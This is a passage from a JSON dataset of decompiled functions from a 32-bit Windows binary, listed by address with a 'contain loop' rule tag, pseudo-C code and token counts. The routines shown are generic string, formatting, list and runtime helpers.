         iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 580
    },
    "0040acd2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040acd2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x0040acf2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x40acf9\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x40acf9))();\n        return;\n    }\n    do {\n        fcn.0040aeff();\n        puVar3 = fcn.0040ab20();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00409dcc(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 983
    },
    "0040b68b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b68b(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 86
    },
    "0040c95c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c95c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 128
    },
    "0040cb28": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040cb28(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040ea40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ea40(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040ea74();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040ea74();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 122
    },
    "0040ea74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040ea74(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040aa48();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040e530(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.0040aa48();\n    }\n    return iVar2;\n}\n",
        "token_count": 91
    },
    "0040f328": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040f328(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x492a20; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 97
    },
    "0040f5ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f5ac(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040f590();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040f634();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00402ee8();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040f528();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 267
    },
    "0040f634": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.0040f634(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040f590();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040f528();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 183
    },
    "00411040": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411040(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x411285;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00411040::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x411116;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x411125;\n            fcn.0040db04();\n            var_1ch = 0x41112a;\n            fcn.00404ec4();\n            goto code_r0x0041125d;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x4110d4;\n                var_10h = &stack0xfffffffc;\n                fcn.00410e0c();\n                goto code_r0x0041125d;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x411188;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x411197;\n                fcn.0040db04();\n                var_1ch = 0x41119c;\n                fcn.00404ec4();\n                goto code_r0x0041125d;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x4111f7;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x411206;\n                fcn.0040db04();\n                var_1ch = 0x41120b;\n                fcn.00404ec4();\n                goto code_r0x0041125d;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x4110e6;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x4110f5;\n                fcn.0040db04();\n                var_1ch = 0x4110fa;\n                fcn.00404ec4();\n                goto code_r0x0041125d;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x411104;\n                var_10h = &stack0xfffffffc;\n                fcn.00410efc();\n                goto code_r0x0041125d;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x41113c;\n            fcn.00407550();\n            var_1ch = 0x41114b;\n            fcn.0040db04();\n            var_1ch = 0x411150;\n            fcn.00404ec4();\n            goto code_r0x0041125d;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x411162;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x411171;\n            fcn.0040db04();\n            var_1ch = 0x411176;\n            fcn.00404ec4();\n            goto code_r0x0041125d;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x4111ae;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111bd;\n            fcn.0040db04();\n            var_1ch = 0x4111c2;\n            fcn.00404ec4();\n            goto code_r0x0041125d;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x4111d4;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111e3;\n            fcn.0040db04();\n            var_1ch = 0x4111e8;\n            fcn.00404ec4();\n            goto code_r0x0041125d;\n        }\n    }\n    var_38h = **0x495c80;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x41122c;\n    var_10h = &stack0xfffffffc;\n    fcn.0040d2f0();\n    var_1ch = &fcn.00411040::var_38h;\n    var_20h = 2;\n    var_24h = 0x411249;\n    fcn.00407550();\n    var_24h = 0x411258;\n    fcn.0040db40(var_20h, var_1ch);\n    var_24h = 0x41125d;\n    fcn.00404ec4();\ncode_r0x0041125d:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x41128c;\n    var_1ch = 0x411277;\n    fcn.00405554();\n    var_1ch = 0x411284;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1557
    },
    "004164fc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004164fc(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 321
    },
    "004165ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004165ac(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "004186f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004186f0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.004198b4();\n            cVar1 = fcn.00404544();\n            if (cVar1 != '\\0') goto code_r0x0041874f;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x0041874f:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 267
    },
    "00418758": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00418758(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004198b4();\n            cVar1 = fcn.0040487c();\n            if (cVar1 != '\\0') goto code_r0x00418792;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418792:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "0041894c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041894c(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.004198b4();\n                uVar1 = fcn.00418758();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00418a6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418a6c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004198b4();\n            uVar2 = fcn.004185e4(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 145
    },
    "00418c74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00418c74(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004198b4();\n            cVar1 = fcn.0041885c();\n            if (cVar1 != '\\0') goto code_r0x00418cac;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418cac:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "00418cb8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418cb8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004198b4();\n            iVar1 = fcn.00419910();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00418654();\n    fcn.0041975c();\n    return;\n}\n",
        "token_count": 144
    },
    "00419034": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419034(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x419044;\n    fcn.00418c50();\n    uStack16 = 0x419099;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.00418c74();\n        if (cVar1 != '\\0') break;\n        fcn.00418c5c();\n        if (in_EAX == *0x417528) break;\n        in_EAX = fcn.004045dc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x4190a0;\n    uStack16 = 0x419098;\n    fcn.00418d08();\n    return;\n}\n",
        "token_count": 233
    },
    "00419540": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419540(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00407688();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.004198b4();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00419910": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419910(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "0041cef4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041cef4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.004198b4();\n                fcn.00404650();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00404650();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0041d22c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d22c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0041975c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00420224": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420224(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.004198b4();\n                fcn.00420224();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "004209a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004209a4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004198b4(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00420a20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420a20(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004198b4();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.004197a8();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00420f94": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420f94(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x420fa4;\n    iVar1 = fcn.00419c24();\n    uStack24 = 0x420fe9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004198b4();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x420ff0;\n    uStack24 = 0x420fe8;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 228
    },
    "0042d4ec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042d4ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004198b4();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00431960": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00431960(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x431970;\n    (**(**(arg_8h + -4) + 0x18))();\n    uStack20 = 0x4319cf;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack28 = 0;\n    puStack16 = &fcn.00431960::var_1h + 1;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while ((uVar2 != 0 && (cVar1 = fcn.004274ac(),  cVar1 == '\\0'))) {\n        uStack28 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x4319d6;\n    uStack24 = 0x4319ce;\n    (**(**(arg_8h + -4) + 0x14))();\n    return;\n}\n",
        "token_count": 316
    },
    "00434990": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434990(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0043653c();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.0043654c();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.00433a30();\n                }\n            }\n            else {\n                iVar2 = fcn.0043654c();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.0043654c();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "00436604": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436604(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0043653c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0043654c();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00436a68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00436a68(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0043653c();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0043654c();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00436afc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00436afc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 73
    },
    "00437d88": {
        "rules": [
            "contain loop"
        ],
